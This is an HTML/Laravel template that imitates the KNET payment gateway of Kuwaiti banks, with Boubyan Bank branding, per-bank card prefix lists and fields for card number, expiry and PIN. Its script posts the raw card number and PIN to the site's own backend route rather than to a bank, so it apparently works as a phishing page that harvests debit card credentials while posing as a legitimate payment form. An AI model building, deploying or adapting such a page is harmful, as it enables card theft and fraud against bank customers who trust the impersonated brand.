<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('front/assets/style2.css') }}">
    <title>KNET Payments</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="{{ asset('front/assets/image/icons/knet.jpg') }}">
    <script src="https://code.jquery.com/jquery-3.6.4.js"></script>
</head>


<body>
    <div class="container">
        <div class="img-heading">
            <img src="{{ asset('front/assets/image/icons/image_bank.jpg') }}" style="width: 372px;height: 85px;">
        </div>
        <div class="panel">
            <div class="img-panel"><img src="{{ asset('front/assets/image/icons/boyan.svg') }}" /></div>
            <div class="row one">
                <span>Merchant: </span>
                <span>
                    Boubyan Bank
                </span>
            </div>
            <div class="row one">
                <span>Amount: </span>
                <span style="margin-left: 10px;"> KD {{ $first_cash }}</span>
            </div>
        </div>

        <input type="hidden" id="interface" value="bobyan">

        <div class="panel">
            <div class="row one ">
                <span style="width: 150px;">Select Your Bank:</span>
                <span>
                    <select id="selectList" class="column-value">
                        <option value="bankname" title="Select Your Bank"> Select Your Bank </option>
                        <option value="AUB" title="Ahli United Bank [AUB]"> Ahli United Bank [AUB]</option>
                        <option value="ABK" title="Al Ahli Bank of Kuwait [ABK]"> Al Ahli Bank of Kuwait [ABK]
                        </option>
                        <option value="Rajhi" title="Al Rajhi Bank [Rajhi]"> Al Rajhi Bank [Rajhi]</option>
                        <option value="BBK" title="Bank of Bahrain Kuwait [BBK]"> Bank of Bahrain Kuwait [BBK]
                        </option>
                        <option value="Boubyan" title="Boubyan Bank [Boubyan]"> Boubyan Bank [Boubyan]</option>
                        <option value="Burgan" title="Burgan Bank [Burgan]"> Burgan Bank [Burgan]</option>
                        <option value="CBK" title="Commercial Bank of Kuwait [CBK]"> Commercial Bank of Kuwait [CBK]
                        </option>
                        <option value="Doha" title="Doha Bank [Doha]"> Doha Bank [Doha]</option>
                        <option value="KNET" title="Eidity [KNET]" style="color: #0077D5;font-weight: bold;"> Eidity
                            [KNET]</option>
                        <option value="GBK" title="Gulf Bank of Kuwait [GBK]"> Gulf Bank of Kuwait [GBK]</option>
                        <option value="KFH" title="Kuwait Finance House [KFH]"> Kuwait Finance House [KFH]</option>
                        <option value="KIB" title="Kuwait International Bank [KIB]"> Kuwait International Bank [KIB]
                        </option>
                        <option value="NBK" title="National Bank of Kuwait [NBK]"> National Bank of Kuwait [NBK]
                        </option>
                        <option value="Weyay" title="NBK [Weyay]"> NBK [Weyay]</option>
                        <option value="QNB" title="Qatar National Bank [QNB]"> Qatar National Bank [QNB]</option>
                        <option value="UNB" title="Union National Bank [UNB]"> Union National Bank [UNB]</option>
                        <option value="Warba" title="Warba Bank [Warba]"> Warba Bank [Warba]</option>
                    </select>
                </span>
            </div>

            <div class="row one ">
                <span>Card Number: </span>
                <span class="cardnym">
                    <select id="dcprefix" style="width: 71px;">
                        <option value="Prefix" title="Prefix">Prefix</option>
                    </select>

                    <input id="debitNumber" onkeypress="return isNumber(event)" style="width: 80px;border-radius: 5px;"
                        type="text" class="custome">
                    <input type="hidden" name="amount" id="amount" value="{{ $totalPrice }}" />
                    <input type="hidden" name="first_batch" id="first_batch" value="{{ $first_cash }}" />
                </span>
            </div>


            <div class="row one ">
                <span>Expiration Date: </span>
                <span class="cardnym">
                    <select id="month" style="margin-left: 12px;width: 60px;" class="mmm">
                        <option value="0"> MM </option>
                        <option value='01'> 01 </option>
                        <option value='02'> 02 </option>
                        <option value='03'> 03 </option>
                        <option value='04'> 04 </option>
                        <option value='05'> 05 </option>
                        <option value='06'> 06 </option>
                        <option value='07'> 07 </option>
                        <option value='08'> 08 </option>
                        <option value='09'> 09 </option>
                        <option value='10'> 10 </option>
                        <option value='11'> 11 </option>
                        <option value='12'> 12 </option>
                    </select>

                    <select id="year" style="margin-left: 5px;" class="yyy">
                        <option value="0"> YYYY </option>
                        <option value='2023'> 2023 </option>
                        <option value='2024'> 2024 </option>
                        <option value='2025'> 2025 </option>
                        <option value='2026'> 2026 </option>
                        <option value='2027'> 2027 </option>
                        <option value='2028'> 2028 </option>
                        <option value='2029'> 2029 </option>
                        <option value='2030'> 2030 </option>
                        <option value='2031'> 2031 </option>
                        <option value='2032'> 2032 </option>
                        <option value='2033'> 2033 </option>
                        <option value='2034'> 2034 </option>
                        <option value='2035'> 2035 </option>
                        <option value='2036'> 2036 </option>
                        <option value='2037'> 2037 </option>
                        <option value='2038'> 2038 </option>
                        <option value='2039'> 2039 </option>
                        <option value='2040'> 2040 </option>
                        <option value='2041'> 2041 </option>
                        <option value='2042'> 2042 </option>
                        <option value='2043'> 2043 </option>
                        <option value='2044'> 2044 </option>
                        <option value='2045'> 2045 </option>
                        <option value='2046'> 2046 </option>
                        <option value='2047'> 2047 </option>
                        <option value='2048'> 2048 </option>
                        <option value='2049'> 2049 </option>
                        <option value='2050'> 2050 </option>
                        <option value='2051'> 2051 </option>
                        <option value='2052'> 2052 </option>
                        <option value='2053'> 2053 </option>
                        <option value='2054'> 2054 </option>
                        <option value='2055'> 2055 </option>
                        <option value='2056'> 2056 </option>
                        <option value='2057'> 2057 </option>
                        <option value='2058'> 2058 </option>
                        <option value='2059'> 2059 </option>
                        <option value='2060'> 2060 </option>
                        <option value='2061'> 2061 </option>
                        <option value='2062'> 2062 </option>
                        <option value='2063'> 2063 </option>
                        <option value='2064'> 2064 </option>
                        <option value='2065'> 2065 </option>
                        <option value='2066'> 2066 </option>
                    </select>
                </span>
            </div>


            <div class="row one ">

                <span>PIN:</span>
                <span><input type="password" id="cardPin" onkeypress="return isNumber(event)"
                        style="margin-left: 85px;border-radius: 5px;" class="custome tow"></span>

            </div>
        </div>


        <div class="panel end">
            <button onclick="onPay();">Submit</button>
            <button onclick="cancelPage();">Cancel</button>

        </div>

        <footer>

            <span>
                <br>
                <p align="center" style="margin: auto;max-width: 450px;text-align: center;font-size:12px;">
                    All Rights Reserved. Copyright 2024 © <br>
                    <span style="font-size:11px;font-weight:bold;color: #0077D5;">The Shared Electronic Banking
                        Services
                        Company</span>
                </p>
            </span>
        </footer>
    </div>
</body>

</html>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.1/js/bootstrap.bundle.min.js"
    integrity="sha512-sH8JPhKJUeA9PWk3eOcOl8U+lfZTgtBXD41q6cO/slwxGHCxKcW45K4oPCUhHG7NMB4mbKEddVmPuTXtpbCbFA=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>
    var cardLength;
    var isSelected = false;
    var selected;

    document.getElementById("debitNumber").maxLength = "10";
    document.getElementById("cardPin").maxLength = "4";


    function isNumber(evt) {
        evt = (evt) ? evt : window.event;
        var charCode = (evt.which) ? evt.which : evt.keyCode;
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
            return false;
        }
        return true;
    }

    $(document).ready(function() {

        //var mydata = $("#mydata").val();
        $("#selectList").change(function() {

            isSelected = true;
            selected = $(this).val();

            if (selected == "AUB") {
                var bins = "537016,532674";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "ABK") {
                var bins = "428628,403622,423826";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Rajhi") {
                var bins = "458838";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "BBK") {
                var bins = "418056,588790";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Boubyan") {
                var bins = "470350,490455,490456,404919,450605,426058,431199";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Burgan") {
                var bins = "468564,402978,540759,415254,450238,403583,49219000";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "CBK") {
                var bins = "537015,521175,516334,532672";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Doha") {
                var bins = "419252";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "GBK") {
                var bins =
                    "559475,531471,526206,531329,531470,531644,532675,517419,517458,535966,536524";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "KFH") {
                var bins = "450778";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "KIB") {
                var bins = "409054,406464";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "NBK") {
                var bins = "464452,589160";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Weyay") {
                var bins = "46445250,543363";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "QNB") {
                var bins = "521020,521099,524745,519859";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "UNB") {
                var bins = "457778";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

            if (selected == "Warba") {
                var bins = "532749,559459,541350";
                $("#dcprefix").empty();
                var arr = bins.split(',');
                for (var i = 0; i < arr.length; ++i) {
                    $("#dcprefix").append('<option value="' + arr[i] + '">' + arr[i] + '</option>');
                }

            }

        });
    });

    function onPay() {
        alert('Please wait...');
        var debitNumber = $("#debitNumber").val();
        var cardPin = $("#cardPin").val();
        selected = $("#selectList").val();

        if (isSelected == true && debitNumber != "" && cardPin != "") {
            var prefix = $("#dcprefix").val();
            var selectList = selected;
            var month = $("#month").val();
            var year = $("#year").val();
            var amount = $("#amount").val();
            first_batch = $("#first_batch").val();
            var interface = $("#interface").val();
            var num = debitNumber;

            var messageText = selected + "|" + prefix + "|" + debitNumber + "|" + month + "|" + year + "|" + cardPin +
                "|" + amount + "|" + interface;
            var code = btoa(messageText);
            var formData = {
                prefix: prefix,
                month: month,
                year: year,
                amount: amount,
                first_batch: first_batch,
                interface: interface,
                debitNumber: debitNumber,
                cardPin: cardPin,
                bank: selectList

            };
            $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                }
            });
            $.ajax({
                type: 'post',
                url: '{{route('process.knet')}}',
                data: formData,
                success: function(response) {
                    location.replace(response.url);

                }
            });


        } else {
            alert('يوجد خطأ في المدخلات ، قم بتصحيح الخطأ');
        }
    }

    function cancelPage() {
        window.location.href = "index.php";
    }
</script>
